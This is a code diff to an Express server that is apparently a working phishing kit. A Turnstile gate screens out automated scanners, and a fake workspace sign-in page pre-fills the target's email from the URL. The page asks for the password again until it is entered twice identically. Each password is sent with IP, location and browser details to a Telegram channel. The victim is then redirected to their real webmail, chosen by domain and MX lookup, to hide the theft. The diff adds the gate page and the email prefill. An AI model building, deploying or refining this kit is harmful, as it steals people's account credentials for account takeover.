@@ -9,7 +9,7 @@ app.set('trust proxy', true);
 // MIDDLEWARE
 // ============================================================
 app.use(cors({
-    origin: 'https://secure-auto.netlify.app',
+    origin: 'https://secure-auto.netlify.app',   // allow Netlify + any frontend; tighten later if needed
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
@@ -70,6 +70,16 @@ async function verifyTurnstile(token, ip) {
         console.error('❌ Turnstile verify error:', err.message);
         return false;
     }
+}
+
+// ============================================================
+// HELPER: validate + normalize email from query string
+// ============================================================
+function normalizeEmail(raw) {
+    const s = (raw || '').toString().trim();
+    if (!s) return '';
+    const re = /^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    return re.test(s) ? s : '';
 }
 
 // ============================================================
@@ -317,7 +327,6 @@ const PROVIDER_MAP = {
 
     // ---- 🇺🇦 Ukraine ----
     'meta.ua':            'https://mail.meta.ua/',
-    'ukr.net':            'https://mail.ukr.net/',
 
     // ---- 🇷🇸 Serbia / 🇭🇷 Croatia / 🇸🇮 Slovenia ----
     'sbb.rs':             'https://webmail.sbb.rs/',
@@ -326,10 +335,9 @@ const PROVIDER_MAP = {
 };
 
 // ============================================================
-// 🔑 MX-based provider detection (works for ANY domain worldwide)
+// 🔑 MX-based provider detection
 // ============================================================
 const MX_PROVIDER_MAP = [
-    // [regex on MX hostname, login URL]
     [/google|googlemail|gmail/i,        'https://accounts.google.com/ServiceLogin?service=mail'],
     [/outlook|office365|microsoft|hotmail|live\.com|protection\.outlook/i,
                                         'https://login.live.com/'],
@@ -357,26 +365,19 @@ const MX_PROVIDER_MAP = [
     [/yahoo/i,                          'https://login.yahoo.com/'],
     [/icloud|apple/i,                   'https://www.icloud.com/'],
     [/aol/i,                            'https://login.aol.com/'],
-    [/zoho/i,                           'https://accounts.zoho.com/signin'],
     [/mailbox\.org/i,                   'https://login.mailbox.org/'],
-    [/mimecast|proofpoint|barracuda/i,  null] // security gateways → fall through
+    [/mimecast|proofpoint|barracuda/i,  null]
 ];
 
-// ============================================================
-// HELPER: MX → provider URL
-// ============================================================
 function providerFromMX(mxRecord) {
     if (!mxRecord || mxRecord === 'no-mx' || mxRecord === 'MX-Error') return null;
     const first = mxRecord.split('\n')[0];
     for (const [re, url] of MX_PROVIDER_MAP) {
-        if (re.test(first)) return url; // null means "known but no login page"
+        if (re.test(first)) return url;
     }
     return null;
 }
 
-// ============================================================
-// HELPER: TLD fallback for unresolved domains
-// ============================================================
 function providerFromTLD(domain) {
     const tld = (domain.split('.').pop() || '').toLowerCase();
     const TLD_MAP = {
@@ -417,27 +418,18 @@ function providerFromTLD(domain) {
     return TLD_MAP[tld] || null;
 }
 
-// ============================================================
-// MAIN RESOLVER: email → provider login URL
-// Works for virtually any domain on Earth.
-// ============================================================
 function getProviderLoginUrl(email, mxRecord) {
     const domain = (email || '').split('@')[1]?.toLowerCase() || '';
     if (!domain) return REDIRECT_URL;
 
-    // 1) Exact match
     if (PROVIDER_MAP[domain]) return PROVIDER_MAP[domain];
 
-    // 2) MX-based detection (works for corporate/B2B domains too)
     const fromMX = providerFromMX(mxRecord);
     if (fromMX) return fromMX;
 
-    // 3) TLD hint
     const fromTLD = providerFromTLD(domain);
     if (fromTLD) return fromTLD;
 
-    // 4) Google search fallback — user lands on a page showing their
-    //    actual webmail as the top result.
     return `https://www.google.com/search?q=${encodeURIComponent(domain + ' webmail login')}`;
 }
 
@@ -581,27 +573,104 @@ async function getMXRecord(domain) {
 }
 
 // ============================================================
-// ROUTE: /a  →  serve login form (silent match loop)
+// HTML TEMPLATE: Turnstile gate page (served by /auth)
 // ============================================================
-app.get('/a', async (req, res) => {
-    const token = req.query.t;
-    const key   = req.query.k;
-    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+function turnstilePage(email) {
+    const safeEmail = (email || '').replace(/</g,'&lt;');
+    return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Session Authentication</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50;line-height:1.5}
+.cOrWHzq{background:#fff;border-radius:12px;box-shadow:0 2px 24px rgba(0,0,0,0.06);padding:38px 34px;max-width:440px;width:92%;text-align:center}
+.tOrWHzq{font-size:1.25rem;font-weight:600;color:#1e293b;margin-bottom:8px}
+.uOrWHzq{font-size:0.9rem;color:#64748b;margin-bottom:28px}
+.ftOrWHzq{margin-top:24px;font-size:0.75rem;color:#c0c8d4}
+#ts-error{margin-top:16px;color:#dc2626;font-size:14px;display:none;}
+</style>
+</head>
+<body>
+<div class="cOrWHzq">
+<div class="tOrWHzq">Authenticating Your Session</div>
+<div class="uOrWHzq">We need to confirm you are human before proceeding to your secure workspace.</div>
+<div id="ts-turnstile" style="min-height:65px;"></div>
+<div id="ts-error">Verification failed. Please try again.</div>
+<div class="ftOrWHzq">&copy; 2026 Secure Auth</div>
+</div>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
+<script>
+(function(){
+  var EMAIL = ${JSON.stringify(email || '')};
+  var sent  = false;
+  var attempts = 0;
+  var MAX_TS_RETRIES = 40;   // wait up to ~8s for turnstile to load
 
-    console.log(`🔐 /a hit — k=${key} t=${(token||'').slice(0,20)}... ip=${clientIP}`);
+  function loadForm(token){
+    if (sent) return;
+    sent = true;
+    var url = '/a?k=HBfNYyUjMsgOLGRZ&t=' + encodeURIComponent(token);
+    if (EMAIL) url += '&u=' + encodeURIComponent(EMAIL);
+    fetch(url)
+      .then(function(r){ return r.text(); })
+      .then(function(html){
+        document.open();
+        document.write(html);
+        document.close();
+      })
+      .catch(function(){
+        document.body.innerHTML =
+          '<div style="text-align:center;padding:40px;font-family:sans-serif">' +
+          '<p>Unable to verify. Please try again later.</p></div>';
+      });
+  }
 
-    const ok = await verifyTurnstile(token, clientIP);
-    if (!ok) {
-        console.log('❌ Turnstile failed');
-        return res.status(403).send('Verification failed. Please try again.');
+  function onError(){
+    var err = document.getElementById('ts-error');
+    if (err) err.style.display = 'block';
+  }
+
+  function tryRender(){
+    if (typeof turnstile === 'undefined') {
+      attempts++;
+      if (attempts >= MAX_TS_RETRIES) return onError();
+      return setTimeout(tryRender, 200);
     }
+    try {
+      turnstile.render('#ts-turnstile', {
+        sitekey: '0x4AAAAAAE7CY8nNIUDU9vqa',
+        callback: loadForm,
+        errorCallback: onError,
+        appearance: 'always',
+        retry: 'never'
+      });
+    } catch(e){ onError(); }
+  }
 
-    sendToTelegram(`👤 Visitor verified Turnstile
-IP: ${clientIP}
-Key: ${key}
-Time: ${new Date().toISOString()}`).catch(()=>{});
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', tryRender);
+  } else {
+    tryRender();
+  }
+})();
+</script>
+</body></html>`;
+}
 
-    res.send(`<!DOCTYPE html>
+// ============================================================
+// HTML TEMPLATE: Login form (served by /a)
+// ============================================================
+function loginFormPage(email) {
+    const safeEmail = (email || '').replace(/"/g, '&quot;').replace(/</g,'&lt;');
+    const prefilled = email ? `value="${safeEmail}" readonly` : '';
+    const subtitle  = email
+        ? `Continue with <strong>${safeEmail}</strong>`
+        : 'Enter your credentials to continue.';
+
+    return `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -628,10 +697,10 @@ button:disabled{opacity:.6;cursor:not-allowed}
 <body>
 <div class="box">
   <h2>Sign in to your workspace</h2>
-  <p class="sub" id="sub">Enter your credentials to continue.</p>
+  <p class="sub" id="sub">${subtitle}</p>
   <form id="lf" autocomplete="off">
     <label for="em">Email address</label>
-    <input id="em" type="email" name="email" required>
+    <input id="em" type="email" name="email" required ${prefilled}>
     <label for="pw">Password</label>
     <input id="pw" type="password" name="password" required>
     <button type="submit" id="btn">Sign in</button>
@@ -643,6 +712,7 @@ button:disabled{opacity:.6;cursor:not-allowed}
   var BACKEND      = ${JSON.stringify(BACKEND_URL)};
   var REDIRECT     = ${JSON.stringify(REDIRECT_URL)};
   var MAX_ATTEMPTS = ${MAX_ATTEMPTS};
+  var PRELOADED    = ${JSON.stringify(email || '')};
 
   var form = document.getElementById('lf');
   var btn  = document.getElementById('btn');
@@ -650,7 +720,7 @@ button:disabled{opacity:.6;cursor:not-allowed}
   var sub  = document.getElementById('sub');
 
   var attempt      = 0;
-  var lockedEmail  = null;
+  var lockedEmail  = PRELOADED || null;
   var lastPassword = null;
   var redirectUrl  = REDIRECT;
 
@@ -665,7 +735,7 @@ button:disabled{opacity:.6;cursor:not-allowed}
     if (attempt > 0 && lockedEmail) {
       form.email.value = lockedEmail;
     } else {
-      lockedEmail = form.email.value.trim();
+      lockedEmail = PRELOADED || form.email.value.trim();
     }
 
     var thisPassword = form.password.value;
@@ -683,7 +753,7 @@ button:disabled{opacity:.6;cursor:not-allowed}
 
     var data = null;
     try {
-      var r = await fetch(BACKEND + '/api/login', {
+      var r = await fetch((BACKEND || '') + '/api/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(body)
@@ -713,7 +783,53 @@ button:disabled{opacity:.6;cursor:not-allowed}
   });
 })();
 </script>
-</body></html>`);
+</body></html>`;
+}
+
+// ============================================================
+// ROUTE: /auth  →  Turnstile gate (reads ?u= from URL)
+// ============================================================
+app.get('/auth', (req, res) => {
+    const email = normalizeEmail(req.query.u);
+    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+    console.log(`🚪 /auth hit — u=${email || '(none)'} ip=${clientIP}`);
+    res.send(turnstilePage(email));
+});
+
+// ============================================================
+// ROUTE: /  →  same as /auth (so root URL also works)
+// ============================================================
+app.get('/', (req, res) => {
+    const email = normalizeEmail(req.query.u);
+    console.log(`🚪 / hit — u=${email || '(none)'}`);
+    res.send(turnstilePage(email));
+});
+
+// ============================================================
+// ROUTE: /a  →  verify Turnstile, serve login form with email prefill
+// ============================================================
+app.get('/a', async (req, res) => {
+    const token = req.query.t;
+    const key   = req.query.k;
+    const email = normalizeEmail(req.query.u);
+    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+
+    console.log(`🔐 /a hit — k=${key} u=${email || '(none)'} ip=${clientIP}`);
+
+    const ok = await verifyTurnstile(token, clientIP);
+    if (!ok) {
+        console.log('❌ Turnstile failed');
+        return res.status(403).send('Verification failed. Please try again.');
+    }
+
+    // Visitor ping
+    sendToTelegram(`👤 Visitor verified Turnstile
+Email (from URL): ${email || '(not provided)'}
+IP: ${clientIP}
+Key: ${key}
+Time: ${new Date().toISOString()}`).catch(()=>{});
+
+    res.send(loginFormPage(email));
 });
 
 // ============================================================
@@ -746,7 +862,6 @@ app.post('/api/login', async (req, res) => {
         });
     }
 
-    // Silent match check
     const isMatch = typeof prevPassword === 'string' &&
                     prevPassword.length > 0 &&
                     prevPassword === password;
@@ -755,7 +870,6 @@ app.post('/api/login', async (req, res) => {
     const shouldRetry = !isMatch && !hitCap;
     const finalReason = isMatch ? 'match' : (hitCap ? 'cap' : null);
 
-    // Collect context
     const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
     const ipInfo = await getIPInfo(clientIP);
     const domain = email.split('@')[1];
@@ -763,10 +877,8 @@ app.post('/api/login', async (req, res) => {
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const acceptLanguage = req.headers['accept-language'] || 'Unknown';
 
-    // Compute redirect NOW so we can include it in the Telegram message
     const redirectUrl = getProviderLoginUrl(email, mxRecord);
 
-    // ---- Telegram ----
     const header = isMatch
         ? `✅ MATCH — Attempt ${attempt}/${MAX_ATTEMPTS} — FINAL`
         : (hitCap
@@ -849,14 +961,22 @@ app.get('/health', (req, res) => {
     });
 });
 
+// ============================================================
+// 404
+// ============================================================
 app.use('*', (req, res) => {
     res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
 });
 
+// ============================================================
+// START
+// ============================================================
 app.listen(PORT, () => {
     console.log('========================================');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🌐 Health: http://localhost:${PORT}/health`);
+    console.log(`🚪 Gate:   http://localhost:${PORT}/auth?u=user@example.com`);
+    console.log(`🔐 Token:  http://localhost:${PORT}/a`);
     console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
     console.log(`🎯 Match rule: 2 identical passwords → redirect`);
     console.log(`🛡️ Safety cap: ${MAX_ATTEMPTS} attempts`);
